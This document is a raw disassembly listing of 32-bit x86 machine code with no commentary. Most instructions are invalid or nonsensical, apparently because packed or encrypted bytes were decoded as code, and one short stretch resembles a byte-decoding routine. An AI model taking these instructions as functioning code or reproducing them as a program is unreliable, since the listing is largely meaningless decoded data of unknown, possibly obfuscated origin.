  415f62:	shr    BYTE PTR [edx],1
  415f64:	call   FWORD PTR [eax+0x6d]
  415f67:	out    0x1,eax
  415f69:	sub    ch,ah
  415f6b:	inc    edi
  415f6c:	and    al,0x91
  415f6e:	push   ebx
  415f6f:	in     eax,dx
  415f70:	mov    esp,0x1e5b47f8
  415f75:	cmp    esp,DWORD PTR [edx]
  415f77:	dec    esp
  415f78:	pusha  
  415f79:	cmp    al,0x7e
  415f7b:	lahf   
  415f7c:	jno    0x415f8a
  415f7e:	mov    edx,0x8d8b3179
  415f83:	fimul  DWORD PTR [edx]
  415f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f86:	dec    ecx
  415f87:	mov    dl,BYTE PTR [eax+0x18]
  415f8a:	stos   BYTE PTR es:[edi],al
  415f8b:	mov    ds:0x8207af1d,al
  415f90:	or     ebx,0xb56c6c7
  415f96:	test   eax,0xd9d6fb4e
  415f9b:	pop    esi
  415f9c:	mov    cl,0x79
  415f9e:	or     al,cl
  415fa0:	pop    ebx
  415fa1:	cwde   
  415fa2:	inc    edx
  415fa3:	mov    dl,0x3
  415fa5:	loop   0x415f36
  415fa7:	or     edx,DWORD PTR [ecx+0x21]
  415faa:	or     esi,DWORD PTR [edi-0xad1deea]
  415fb0:	sar    BYTE PTR [eax+0x30],1
  415fb3:	loop   0x415f4f
  415fb5:	sub    BYTE PTR [edx+0x7b],bl
  415fb8:	ins    BYTE PTR es:[edi],dx
  415fb9:	cmc    
  415fba:	fsub   st(7),st
  415fbc:	stos   DWORD PTR es:[edi],eax
  415fbd:	sbb    al,0x9
  415fbf:	and    ebp,DWORD PTR [eax-0x272969fe]
  415fc5:	ror    DWORD PTR ds:0x5c3addab,cl
  415fcb:	test   eax,0x4e094990
  415fd0:	push   es
  415fd1:	inc    eax
  415fd2:	movsx  edx,WORD PTR [ebx-0x68]
  415fd6:	aad    0x31
  415fd8:	xor    BYTE PTR [edi],bh
  415fda:	push   ebx
  415fdb:	cmc    
  415fdc:	sbb    BYTE PTR ds:0xa04d1aaa,dl
  415fe2:	inc    esp
  415fe3:	mov    dh,0xdc
  415fe5:	mov    esi,0x3ee12ee8
  415fea:	out    dx,al
  415feb:	jmp    0xbfeb:0xb9f2cfdf
  415ff2:	dec    ecx
  415ff3:	dec    esi
  415ff4:	pop    edi
  415ff5:	xor    eax,0xf9303ae7
  415ffa:	in     eax,dx
  415ffb:	sub    eax,0x12fff44b
  416000:	or     eax,DWORD PTR ds:0x8b1fb267
  416006:	in     eax,dx
  416007:	stos   BYTE PTR es:[edi],al
  416008:	jnp    0x416042
  41600a:	push   ss
  41600b:	sbb    eax,0xd0e06a0b
  416010:	xor    ebp,DWORD PTR [edi+0x4857e478]
  416016:	mov    dh,0x76
  416018:	jb     0x416070
  41601a:	mov    eax,ds:0x7d2790ae
  41601f:	stos   DWORD PTR es:[edi],eax
  416020:	mov    edi,DWORD PTR [eax+0x64]
  416023:	popa   
  416024:	fsub   DWORD PTR [esi+0x2ad3426]
  41602a:	fldcw  WORD PTR [esi-0x35]
  41602d:	into   
  41602e:	xchg   ecx,eax
  41602f:	inc    ecx
  416030:	hlt    
  416031:	push   edx
  416032:	jns    0x416005
  416034:	jmp    0x2c94:0xb88455d2
  41603b:	inc    eax
  41603c:	pop    ecx
  41603d:	shl    DWORD PTR [ecx],1
  41603f:	fcom   QWORD PTR [eax]
  416041:	ror    DWORD PTR [ecx+0x4a6faad5],0xe0
  416048:	sti    
  416049:	jae    0x41606a
  41604b:	sub    DWORD PTR [ebp+edi*4+0x6d],esp
  41604f:	test   BYTE PTR [ebp+0x1a],al
  416052:	inc    esp
  416053:	(bad)  
  416054:	mul    BYTE PTR [ebx+0xb00363e]
  41605a:	ret    0x1626
  41605d:	dec    ebx
  41605e:	inc    esp
  41605f:	pusha  
  416060:	xchg   eax,eax
  416062:	sar    BYTE PTR [ebx-0x3b0dbcc],cl
  416068:	mov    eax,ecx
  41606a:	cdq    
  41606b:	gs sub al,ah
  41606e:	dec    eax
  41606f:	pop    es
  416070:	mov    eax,ds:0x805a0a48
  416075:	mov    bl,0xe7
  416077:	sub    eax,0xf8087b53
  41607c:	out    dx,al
  41607d:	xchg   edx,eax
  41607e:	lea    ebx,[ecx-0x7d4ad90a]
  416084:	pop    esi
  416085:	test   dl,0x42
  416088:	mov    ds:0x7fa00ea2,eax
  41608d:	xor    bl,BYTE PTR ds:0x370be1b3
  416093:	aaa    
  416094:	std    
  416095:	adc    BYTE PTR [ecx-0x7eb75c41],bh
  41609b:	xor    BYTE PTR [ecx+0x17368898],ch
  4160a1:	xor    eax,0xc9ce0164
  4160a6:	mov    ah,0x64
  4160a8:	sub    DWORD PTR [edx],0xa7154355
  4160ae:	pop    eax
  4160af:	mov    ah,0x75
  4160b1:	jle    0x4160f0
  4160b3:	and    al,0xba
  4160b5:	shl    DWORD PTR ss:[esi-0x27],cl
  4160b9:	jg     0x4160cf
  4160bb:	inc    esi
  4160bc:	cs loope 0x416041
  4160bf:	push   0xfffffff4
  4160c1:	mov    eax,0x71f4b0bc
  4160c6:	or     eax,0x212efc45
  4160cb:	imul   ecx,ecx,0xffffff82
  4160ce:	adc    al,0x44
  4160d0:	or     al,0xa2
  4160d2:	cdq    
  4160d3:	jbe    0x4160bc
  4160d5:	push   edx
  4160d6:	jl     0x4160d1
  4160d8:	pop    edx
  4160d9:	add    BYTE PTR [ebp+0x3a],cl
  4160dc:	cli    
  4160dd:	fisttp QWORD PTR [eax+0x7b]
  4160e0:	add    eax,0x97ebfcbf
  4160e5:	pop    esp
  4160e6:	sbb    DWORD PTR [ecx-0x751137d],esi
  4160ec:	jbe    0x4160cc
  4160ee:	jb     0x4160aa
  4160f0:	pusha  
  4160f1:	loopne 0x41614f
  4160f3:	sbb    al,0x68
  4160f5:	xor    al,0xe2
  4160f7:	xor    BYTE PTR [ebp-0x67],ah
  4160fa:	jnp    0x416094
  4160fc:	and    ebx,DWORD PTR [eax-0xb334e64]
  416102:	and    edx,ebp
  416104:	sub    DWORD PTR [ebx],esi
  416106:	nop
  416107:	test   DWORD PTR [esi+0x3],eax
  41610a:	xor    esp,ebx
  41610c:	mov    al,0xac
  41610e:	(bad)
  416111:	retf   0x6038
  416114:	pop    esi
  416115:	pop    ebp
  416116:	scas   al,BYTE PTR es:[edi]
  416117:	outs   dx,BYTE PTR ds:[esi]
  416118:	cwde   
  416119:	pop    esp
  41611a:	aad    0xa1
  41611c:	jnp    0x4160ef
  41611e:	sub    bl,al
  416120:	sub    al,0xa2
  416122:	sahf   
  416123:	mov    bl,0x3d
  416125:	inc    edi
  416126:	(bad)  
  416127:	loope  0x4160b4
  416129:	and    eax,0x445db072
  41612e:	icebp  
  41612f:	aam    0x3a
  416131:	mov    eax,ds:0xe9e458f
  416136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416137:	mov    edi,0x8a5590ca
  41613c:	test   DWORD PTR [edx],eax
  41613e:	cld    
  41613f:	mov    ch,0x5
  416141:	out    dx,al
  416142:	clc    
  416143:	push   ebx
  416144:	mov    ebx,0x7329bcf0
  416149:	and    eax,0xb26becda
  41614e:	test   ecx,0x24868c3b
  416154:	sub    DWORD PTR [edx+0x58198ed3],ecx
  41615a:	int3   
  41615b:	lods   al,BYTE PTR ds:[esi]
  41615c:	mov    edi,0xe2159b9c
  416161:	rol    DWORD PTR [edi+0x5306a5b9],0xdf
  416168:	sbb    bh,0x5d
  41616b:	jbe    0x41611e
  41616d:	in     al,dx
  41616e:	xor    BYTE PTR [ebx+0x5c],bl
  416171:	and    DWORD PTR [edx-0x45263e21],0x14
  416178:	out    dx,eax
  416179:	pop    edi
  41617a:	pop    esp
  41617b:	inc    ecx
  41617c:	(bad)  
  41617d:	sub    BYTE PTR [ebx],dl
  41617f:	push   ecx
  416180:	xor    DWORD PTR [ecx-0x635bcf47],ebp
  416186:	hlt    
  416187:	call   0xd830:0x2712e581
  41618e:	pop    esi
  41618f:	int3   
  416190:	fldcw  WORD PTR [ecx]
  416192:	jmp    0x416133
  416194:	in     al,dx
  416195:	xchg   esp,eax
  416196:	xchg   DWORD PTR [edx],esi
  416198:	(bad)  
  416199:	daa    
  41619a:	(bad)  
  41619b:	mov    edx,0x2f38c21d
  4161a0:	shl    edx,cl
  4161a2:	retf   0x72ff
  4161a5:	xchg   DWORD PTR ds:[eax-0x44],ecx
  4161a9:	in     al,dx
  4161aa:	shr    eax,0x56
  4161ad:	adc    eax,0x2d98df8a
  4161b2:	cmp    BYTE PTR [esi+0x41],al
  4161b5:	(bad)  
  4161b7:	hlt    
  4161b8:	aad    0xf6
  4161ba:	mov    ah,0x8e
  4161bc:	sti    
  4161bd:	push   ecx
  4161be:	mov    eax,ds:0x1e2971a4
  4161c3:	add    dh,bh
  4161c5:	std    
  4161c6:	mul    DWORD PTR [esi+0x48]
  4161c9:	sbb    ecx,DWORD PTR [ebp+0x15ce1f25]
  4161cf:	dec    edx
  4161d0:	jnp    0x41619c
  4161d2:	pop    edi
  4161d3:	mov    ss,WORD PTR [esi]
  4161d5:	jb     0x416160
  4161d7:	adc    dl,BYTE PTR [ebx+0x37]
  4161da:	retf   
  4161db:	xchg   esp,eax
  4161dc:	push   es
  4161dd:	inc    ecx
  4161de:	js     0x416250
  4161e0:	rol    dh,cl
  4161e2:	mov    ds:0x43a04967,al
  4161e7:	cdq    
  4161e8:	(bad)  
  4161e9:	std    
  4161ea:	xor    DWORD PTR ds:0x2f20a919,ebp
  4161f0:	pop    ebx
  4161f1:	mov    DWORD PTR [edx+0x2b],edi
  4161f4:	fs daa 
  4161f6:	xor    eax,0x2ac1792
  4161fb:	adc    al,0x59
  4161fd:	int    0x21
  4161ff:	std    
  416200:	jmp    0x416189
  416202:	mov    edi,0x4530365e
  416207:	idiv   ch
  416209:	sub    dh,BYTE PTR [ecx+0x77d8bf13]
  41620f:	add    BYTE PTR [esi-0x214da2a1],dh
  416215:	xor    DWORD PTR [ebp-0x5db0583f],edx
  41621b:	repnz mov BYTE PTR [esi+0x42],al
  41621f:	pop    ds
  416220:	jns    0x416253
  416222:	cmp    al,0xdf
  416224:	sbb    al,0x1d
  416226:	out    dx,eax
  416227:	xchg   BYTE PTR [edi-0x1d],dl
  41622a:	pop    esp
  41622b:	lods   al,BYTE PTR ds:[si]
  41622d:	xchg   ecx,eax
  41622e:	addr16 (bad) 
  416230:	dec    edi
  416231:	push   edi
  416232:	inc    ecx
  416233:	aas    
  416234:	cli    
  416235:	out    0x3a,eax
  416237:	mov    ecx,cs
  416239:	push   0xffffffe9
  41623b:	mov    bl,0x3d
  41623d:	lods   eax,DWORD PTR ds:[esi]
  41623e:	fwait
  41623f:	mov    ds:0x6f585b1,al
  416244:	xchg   BYTE PTR [esi],dh
  416246:	jg     0x41624f
  416248:	sbb    al,dh
  41624a:	jp     0x4162a9
  41624c:	mov    fs,WORD PTR es:[eax+0x12]
  416250:	pushf  
  416251:	es push esi
  416253:	aaa    
  416254:	jns    0x4161f8
  416256:	(bad)  
  416257:	mov    cl,0xc3
  416259:	xor    eax,0x857c9688
  41625e:	imul   esp,DWORD PTR [eax+0x7f5b928c],0xffffffdf
  416265:	cwde   
  416266:	addr16 xor ebx,0x68cede49
  41626d:	aas    
  41626e:	ficom  DWORD PTR [ecx-0x2bc734e6]
  416274:	fwait
  416275:	sub    DWORD PTR [ecx*1+0x1479fe87],eax
  41627c:	dec    ebx
  41627d:	sub    dh,BYTE PTR [ebx-0x2bc8e4ac]
  416283:	das    
  416284:	push   0x309e654e
  416289:	imul   ebx,DWORD PTR [edi-0x43],0xffffffcc
  41628d:	push   esi
  41628e:	dec    esi
  41628f:	out    0xe0,al
  416291:	inc    eax
  416292:	jecxz  0x4162d8
  416294:	pop    ecx
  416295:	mov    eax,ds:0x890a0551
  41629a:	jmp    0x24b263d9
  41629f:	popf   
  4162a0:	fs jecxz 0x416237
  4162a3:	inc    eax
  4162a4:	adc    al,0x14
  4162a6:	nop
  4162a7:	enter  0xae56,0xbf
  4162ab:	and    eax,0xd720405
  4162b0:	test   al,0x49
  4162b2:	fiadd  WORD PTR ss:[edx]
  4162b5:	jbe    0x41624b
  4162b7:	push   si
  4162b9:	jbe    0x4162b3
  4162bb:	inc    eax
  4162bc:	sbb    DWORD PTR [esp+eiz*8+0x7fef7818],esp
  4162c3:	jle    0x41628d
  4162c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162c6:	imul   esp,DWORD PTR [eax],0xb08bd377
  4162cc:	lods   eax,DWORD PTR ds:[esi]
  4162cd:	test   BYTE PTR [esi+0x48c9aff1],0x40
  4162d4:	in     eax,0x98
  4162d6:	pop    es
  4162d7:	push   edi
  4162d8:	lds    ebx,FWORD PTR [ecx]
  4162da:	cli    
  4162db:	lock inc edi
  4162dd:	sub    dl,BYTE PTR [esi+0x6b030420]
  4162e3:	mov    BYTE PTR [esi],0xb6
  4162e6:	push   eax
  4162e7:	lahf   
  4162e8:	je     0x41629e
  4162ea:	(bad)  
  4162eb:	sahf   
  4162ec:	mov    bl,0x3d
  4162ee:	data16 loop 0x4162f9
  4162f1:	push   0x29
  4162f3:	inc    esp
  4162f4:	sbb    BYTE PTR [ebp-0x9],dl
  4162f7:	fidiv  WORD PTR [ecx-0x4]
  4162fa:	es je  0x4162de
  4162fd:	inc    ecx
  4162fe:	out    dx,eax
  4162ff:	scas   eax,DWORD PTR es:[edi]
  416300:	mov    ds:0x93fcae4c,al
  416305:	inc    ecx
  416306:	hlt    
  416307:	jecxz  0x4162fd
  416309:	and    edi,eax
  41630b:	scas   al,BYTE PTR es:[edi]
  41630c:	cdq    
  41630d:	sub    BYTE PTR [ebx-0x738d1aef],bl
  416313:	mov    bl,0x5a
  416315:	mov    es,WORD PTR [ebx-0x60]
  416318:	aaa    
  416319:	mov    ?,WORD PTR [edi+0x76adb90d]
  41631f:	xchg   esi,eax
  416320:	inc    edi
  416321:	push   ecx
  416322:	arpl   WORD PTR [ebp-0x3874b9c5],dx
  416328:	inc    ebp
  416329:	aam    0x7d
  41632b:	xor    al,0x0
  41632d:	add    BYTE PTR [ebx+0x558bd445],cl
  416333:	fmul   DWORD PTR [ebx-0x4cd223a3]
  416339:	and    al,0x0
  41633b:	add    BYTE PTR [edi],cl
  41633d:	scas   eax,DWORD PTR es:[edi]
  41633e:	ret    0xef35
  416341:	je     0x416343
  416343:	add    BYTE PTR [ebx],dh
  416345:	shl    bh,cl
  416347:	repz mov edx,DWORD PTR [ebp-0x20]
  41634b:	mov    ebx,DWORD PTR [ebp+0x8]
  41634e:	push   0x20
  416350:	and    eax,edx
  416352:	mov    edx,edi
  416354:	sub    edx,eax
  416356:	sub    edx,0x683
  41635c:	mov    DWORD PTR [ebp-0x2c],edx
  41635f:	mov    eax,DWORD PTR [ebp-0x30]
  416362:	mov    edx,DWORD PTR [ebp-0x34]
  416365:	xor    al,dl
  416367:	mov    edx,DWORD PTR [ebp-0x2c]
  41636a:	xor    al,0x58
  41636c:	and    al,0xd8
  41636e:	add    al,BYTE PTR [ebp+0xc]
  416371:	add    al,0x28
  416373:	jmp    0x41677c
  416378:	mov    ebx,0x41d6c237
  41637d:	cmp    edi,DWORD PTR [ebx-0x6192d245]
  416383:	nop
  416384:	sbb    al,0xae
  416386:	xchg   esi,eax
  416387:	jecxz  0x4163c5
  416389:	int3   
  41638a:	sar    BYTE PTR [esi-0x41413b72],0xde
  416391:	mov    bh,0x28
  416393:	xchg   edx,eax
  416394:	aas    
  416395:	mov    ch,0x4d
  416397:	mov    BYTE PTR [edi-0x27b6a3e1],ah
  41639d:	or     DWORD PTR [eax+edx*2],esi
  4163a0:	dec    esp
  4163a1:	pop    ds
  4163a2:	sbb    DWORD PTR [edx-0x5f],0xfffffff3
  4163a6:	pop    ecx
  4163a7:	mov    edi,0xaf3f442f
  4163ac:	bound  ebx,QWORD PTR [edi+0x745638e2]
  4163b2:	mov    edi,0x4e4827b3
  4163b7:	jmp    0xe8d5:0x611d5daf
  4163be:	mov    ch,0x99
  4163c0:	in     al,0xbd
  4163c2:	loopne 0x4163cb
  4163c4:	xchg   BYTE PTR [ecx-0x27],al
  4163c7:	xchg   edi,eax
  4163c8:	mov    ds:0xb739bf7c,al
  4163cd:	repnz into 
  4163cf:	jmp    0x41642a
  4163d1:	popa   
  4163d2:	in     al,dx
  4163d3:	inc    BYTE PTR [edi-0x49]
  4163d6:	retf   
  4163d7:	jmp    0x3bdfcb0a
  4163dc:	and    DWORD PTR [ebx-0x23],eax
  4163df:	retf   0xe857
  4163e2:	call   0x85cdfb50
  4163e7:	repz test DWORD PTR [ebp-0x15],ebx
  4163eb:	(bad)  
  4163ec:	(bad)  
  4163ed:	mov    ds:0x371a1292,al
  4163f2:	push   edi
  4163f3:	arpl   WORD PTR [edi-0x6a],di
  4163f6:	xchg   DWORD PTR [bx+di-0x794b],edx
  4163fb:	int    0x13
  4163fd:	jle    0x416439
  4163ff:	int    0x17
  416401:	push   ecx
  416402:	inc    ebx
  416403:	js     0x41646a
  416405:	adc    dl,ah
  416407:	aam    0x92
  416409:	inc    edx
  41640a:	xchg   esp,eax
  41640b:	daa    
  41640c:	pop    eax
  41640d:	mov    ecx,0x29d77d34
  416412:	xchg   DWORD PTR [edx+0x5c1d763f],edi
  416418:	pop    ss
  416419:	jne    0x4163cd
  41641b:	stos   BYTE PTR es:[edi],al
  41641c:	adc    esp,DWORD PTR [esi*1+0x47b8e859]
  416423:	add    BYTE PTR [ebp+0x6f179182],cl
  416429:	fidiv  DWORD PTR [edi-0x47]
  41642c:	inc    esi
  41642d:	test   eax,0x840ea8b2
  416432:	test   al,0xea
  416434:	cmp    eax,0xaf59f44f
  416439:	rol    DWORD PTR [eax+0x39],cl
  41643c:	xchg   DWORD PTR [eax],eax
  41643e:	ja     0x41648f
  416440:	fwait
  416441:	aas    
  416442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416443:	push   ebx
  416444:	call   0x81d8:0x47677c2a
  41644b:	sahf   
  41644c:	and    al,0x61
  41644e:	les    eax,FWORD PTR [edx]
  416450:	jbe    0x416426
  416452:	cld    
  416453:	adc    cl,dh
  416455:	adc    bh,BYTE PTR [ebp+0x272a954e]
  41645b:	mov    eax,ds:0x5d65177f
  416460:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  416462:	dec    eax
  416463:	aaa    
  416464:	adc    BYTE PTR [ebx-0x54],al
  416467:	mov    bh,0x73
  416469:	adc    al,0xb4
  41646b:	mov    ebp,0xc0568223
  416470:	stos   DWORD PTR es:[edi],eax
  416471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416472:	dec    eax
  416473:	xchg   edi,eax
  416474:	adc    ebp,DWORD PTR ds:[edi-0x63]
  416478:	lods   al,BYTE PTR ds:[esi]
  416479:	jbe    0x416423
  41647b:	or     BYTE PTR [edi],dh
  41647d:	jns    0x416404
  41647f:	mov    cl,0xdb
  416481:	jae    0x4164c2
  416483:	dec    edi
  416484:	push   ebx
  416485:	fild   DWORD PTR [eax-0x54]
  416488:	sub    al,0x82
  41648a:	and    al,0x54
  41648c:	push   esi
  41648d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41648e:	sub    BYTE PTR [ecx+0x1c],bh
  416491:	mov    al,ds:0x343a1d4c
  416496:	int3   
  416497:	fadd   DWORD PTR [eax+ebp*1+0x20]
  41649b:	push   esi
  41649c:	ror    cl,cl
  41649e:	push   ecx
  41649f:	sti    
  4164a0:	adc    eax,DWORD PTR [eax+eiz*4]
  4164a3:	ja     0x416508
  4164a5:	push   esi
  4164a6:	pop    edi
  4164a7:	hlt    
  4164a8:	out    0x2,eax
  4164aa:	test   al,0xdd
  4164ad:	sbb    eax,0xdab72e93
  4164b2:	cs stos DWORD PTR es:[edi],eax
  4164b4:	mov    eax,DWORD PTR [ecx]
  4164b6:	outs   dx,BYTE PTR ds:[esi]
  4164b7:	fadd   st,st(4)
  4164b9:	push   ds
  4164ba:	stc    
  4164bb:	push   esp
  4164bc:	xor    al,0xc8
  4164be:	je     0x416518
  4164c0:	into   
  4164c1:	bound  edi,QWORD PTR ds:0x113b3cca
  4164c7:	jno    0x416483
  4164c9:	sub    BYTE PTR [edi+0xd50d14d],ch
  4164cf:	push   esp
  4164d0:	ror    BYTE PTR [ebx],1
  4164d2:	xor    al,0xa
  4164d4:	rol    BYTE PTR [eax+ecx*4+0x6730907a],0xd0
  4164dc:	xchg   ecx,eax
  4164dd:	xchg   DWORD PTR [eax+0x20],edi
  4164e0:	fsubr  QWORD PTR [ebx-0x2a]
  4164e3:	(bad)  
  4164e4:	sub    al,0x72
  4164e6:	cdq    
  4164e7:	mov    al,ds:0xbc31dea2
  4164ec:	aas    
  4164ed:	sub    DWORD PTR [ecx+0x7442b254],edi
  4164f3:	dec    ecx
  4164f4:	in     eax,dx
  4164f5:	xchg   ebp,eax
  4164f6:	xchg   edx,eax
  4164f7:	lods   eax,DWORD PTR ds:[esi]
  4164f8:	mov    cl,0x1d
  4164fa:	jl     0x416549
  4164fc:	mov    cl,0x43
  4164fe:	inc    eax
  4164ff:	sub    al,0xd9
  416501:	rcr    BYTE PTR [esi+0x3f45ed3],cl
  416507:	cmp    esp,edi
  416509:	jge    0x416505
  41650b:	ret    0xedf5
  41650e:	or     BYTE PTR [esi+0x5736f130],0x7a
  416515:	fdiv   DWORD PTR [esi-0x4a]
  416518:	mov    edi,0x2584736
  41651d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41651e:	ja     0x416590
  416520:	out    dx,al
  416521:	in     eax,0xd1
  416523:	sti    
  416524:	push   0xafc778eb
  416529:	fsubr  DWORD PTR [ecx+ebx*4-0x4f]
  41652d:	out    0x77,eax
  41652f:	pop    esi
  416530:	cdq    
  416531:	jns    0x4164bd
  416533:	push   es
  416534:	clc    
  416535:	mov    ecx,0x63613748
  41653a:	in     eax,dx
  41653b:	out    dx,eax
  41653c:	(bad)  
  41653d:	out    0x27,eax
  41653f:	sbb    dh,BYTE PTR [ecx]
  416541:	fild   DWORD PTR [ecx]
  416543:	loop   0x416541
  416545:	push   cs
  416546:	inc    ebx
  416547:	pop    edi
  416548:	mov    bl,0x94
  41654a:	and    BYTE PTR [ecx],dl
  41654c:	sbb    DWORD PTR [edx+eiz*4-0x51],edi
  416550:	xchg   ebp,eax
  416551:	push   0xffffffc6
  416553:	add    eax,0xf28fea63
  416558:	test   BYTE PTR [eax+0x6b64e3c6],bh
  41655e:	mov    ebx,0x588a24de
  416563:	and    al,BYTE PTR [edx]
  416565:	fcmovnu st,st(1)
  416567:	test   al,0x73
  416569:	outs   dx,DWORD PTR ds:[esi]
  41656a:	push   ecx
  41656b:	dec    ebp
  41656c:	in     eax,dx
  41656d:	aas    
  41656e:	cmp    BYTE PTR [edi-0x77850a55],bh
  416574:	shl    DWORD PTR [edi+0x24],cl
  416577:	arpl   WORD PTR [ebp+0x78],bp
  41657a:	(bad)  
  41657c:	enter  0xab62,0x21
  416580:	gs addr16 pop ebx
  416583:	popf   
  416584:	dec    ecx
  416585:	mov    edx,0xb3d8a650
  41658a:	jl     0x416560
  41658c:	or     BYTE PTR [eax+edx*1],0x15
  416590:	xchg   ecx,eax
  416591:	repnz jmp 0xe30b:0x915f0eb0
  416599:	push   edi
  41659a:	(bad)  
  41659b:	out    dx,al
  41659c:	push   esi
  41659d:	sub    BYTE PTR [edx+0x58],dh
  4165a0:	cmc    
  4165a1:	add    BYTE PTR [ebx-0x67],bh
  4165a4:	mov    ds:0xf9130226,al
  4165a9:	sbb    dl,BYTE PTR [eax-0x2ac0d7d3]
  4165af:	call   0xc2c190d4
  4165b4:	test   BYTE PTR [ebx+eiz*8],0xc2
  4165b8:	sbb    ch,BYTE PTR ds:0xbf3c2706
  4165be:	aam    0xd6
  4165c0:	jns    0x4165b1
  4165c2:	xchg   edx,eax
  4165c3:	mov    ecx,eax
  4165c5:	fwait
  4165c6:	dec    edi
  4165c7:	cmp    BYTE PTR [esi-0x38],al
  4165ca:	lahf   
  4165cb:	ds cmp al,0x85
  4165ce:	push   esp
  4165cf:	and    dl,cl
  4165d1:	jmp    0xc20b11cd
  4165d6:	mov    eax,ds:0x2d26bb44
  4165db:	fldcw  WORD PTR [edx]
  4165dd:	push   cs
  4165de:	pushf  
  4165df:	std    
  4165e0:	icebp  
  4165e1:	daa    
  4165e2:	loopne 0x4165bc
  4165e4:	dec    edx
  4165e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165e7:	pop    ss
  4165e8:	ins    BYTE PTR es:[edi],dx
  4165e9:	retf   
  4165ea:	xrelease xchg DWORD PTR [ecx-0x54e0c01e],ebp
  4165f1:	pop    edx
  4165f2:	mov    ebx,edx
  4165f4:	cld    
  4165f5:	push   edx
  4165f6:	or     edx,0x27
  4165f9:	mov    ah,0x4e
  4165fb:	jecxz  0x41659e
  4165fd:	in     al,0x9
  4165ff:	aam    0xef
  416601:	push   edi
  416602:	pop    esi
  416603:	jno    0x416619
  416605:	pop    ds
  416606:	sub    DWORD PTR [ecx],ecx
  416608:	cmp    BYTE PTR [esi+0x1f],cl
  41660b:	or     esp,DWORD PTR [ebp+0x5edf183e]
  416611:	sbb    eax,0xf4cfa3c3
  416616:	adc    DWORD PTR [edi-0x7d],ebx
  416619:	or     DWORD PTR [edi],ecx
  41661b:	jp     0x416643
  41661d:	mov    ebp,0xf2679626
  416622:	cdq    
  416623:	(bad)  
  416625:	jp     0x416698
  416627:	das    
  416628:	mov    al,0x1d
  41662a:	or     dh,0x24
  41662d:	mov    bl,al
  41662f:	clc    
  416630:	xor    cl,BYTE PTR [esp+eiz*8+0x46]
  416634:	cmc    
  416635:	xlat   BYTE PTR ds:[ebx]
  416636:	jl     0x416697
  416638:	(bad)  
  416639:	fs mov esi,0x37db734c
  41663f:	lods   eax,DWORD PTR fs:[esi]
  416641:	addr16 idiv dl
  416644:	jne    0x4165e4
  416646:	mov    dh,0x4d
  416648:	jge    0x416646
  41664a:	dec    esi
  41664b:	je     0x416613
  41664d:	pop    ds
  41664e:	inc    esi
  41664f:	retf   
  416650:	sbb    ecx,DWORD PTR [edi-0x35]
  416653:	(bad)  [edi+0x7e]
  416656:	jbe    0x416604
  416658:	ror    ebp,cl
  41665a:	mov    eax,ds:0x54a6aedb
  41665f:	sbb    ah,cl
  416661:	leave  
  416662:	dec    edx
  416663:	mov    ebx,0xa9fe0107
  416668:	mov    bl,bl
  41666a:	pop    ebx
  41666b:	cmp    al,0x49
  41666d:	sbb    ebx,ebx
  41666f:	xor    DWORD PTR [edi],edi
  416671:	jae    0x416609
  416673:	adc    ch,BYTE PTR [ebp-0x43]
  416676:	loopne 0x4166d2
  416678:	hlt    
  416679:	mov    ds:0x17f0c1eb,eax
  41667e:	inc    esp
  41667f:	je     0x416654
  416681:	retf   
  416682:	adc    eax,DWORD PTR [edx+0x70abba92]
  416688:	sub    eax,0x334ffff8
  41668d:	imul   ecx,DWORD PTR [eax-0x493d85cf],0xffffff84
  416694:	inc    ecx
  416695:	push   esp
  416696:	out    dx,al
  416697:	cmp    al,0x5a
  416699:	sahf   
  41669a:	(bad)
  41669d:	adc    bh,al
  41669f:	xchg   ebp,eax
  4166a0:	jmp    0x41663a
  4166a2:	sbb    ebx,0x87a42d9a
  4166a8:	pop    ecx
  4166a9:	and    al,0x9c
  4166ab:	push   es
  4166ac:	sti    
  4166ad:	mov    esi,0x946fba81
  4166b2:	rol    DWORD PTR [eax+0x1b24fb5c],1
  4166b8:	gs into 
  4166ba:	jb     0x416701
  4166bc:	mov    bl,0xe6
  4166be:	in     eax,dx
  4166bf:	and    dh,bh
  4166c1:	xchg   ecx,eax
  4166c2:	jmp    0x49cb2756
  4166c7:	mov    dl,0x92
  4166c9:	loopne 0x4166f9
  4166cb:	jbe    0x416737
  4166cd:	loopne 0x4166fe
  4166cf:	sbb    DWORD PTR [edi],edx
  4166d1:	or     BYTE PTR [ebp+0x30],ah
  4166d4:	dec    edi
  4166d5:	mov    bl,0xdf
  4166d7:	fisttp QWORD PTR [eax-0x7068b082]
  4166dd:	inc    edi
  4166de:	sub    eax,0xecb50580
  4166e3:	(bad)  
  4166e4:	fimul  WORD PTR [edx*2+0x60e3a3b2]
  4166eb:	jae    0x4166f0
  4166ed:	call   0x2a13420
  4166f2:	loop   0x4166bb
  4166f4:	xor    DWORD PTR [esp+ebp*8+0x3d2962e3],ecx
  4166fb:	push   0x1df08e29
  416700:	xchg   ebx,eax
  416701:	(bad)  
  416702:	dec    ebp
  416703:	in     eax,dx
  416704:	lods   al,BYTE PTR ds:[esi]
  416705:	into   
  416706:	mov    esp,0x4b87b7d
  41670b:	add    ebx,esp
  41670d:	ins    DWORD PTR es:[edi],dx
  41670e:	fisttp DWORD PTR [edx-0x10]
  416711:	push   ss
  416712:	jmp    0x401ef872
  416717:	test   bh,dh
  416719:	adc    BYTE PTR [esp+edx*8],dh
  41671c:	mov    al,0xca
  41671e:	dec    ebx
  41671f:	add    al,0x47
  416721:	pop    eax
  416722:	and    DWORD PTR [ebp-0x1217e006],ecx
  416728:	call   0xb5df320d
  41672d:	test   al,0x37
  41672f:	(bad)  
  416730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416731:	test   BYTE PTR [edi+ebx*2+0x1e],dh
  416735:	scas   eax,DWORD PTR es:[edi]
  416736:	test   edx,esp
  416738:	mov    dh,0x15
  41673a:	mov    BYTE PTR [esi],dl
  41673c:	mov    ah,BYTE PTR [ebp-0x66]
  41673f:	nop
  416740:	push   ds
  416741:	in     al,0x32
  416743:	cdq    
  416744:	and    BYTE PTR [eax+0x3a],ah
  416747:	mov    esp,0xc8062b7c
  41674c:	rol    al,0xf1
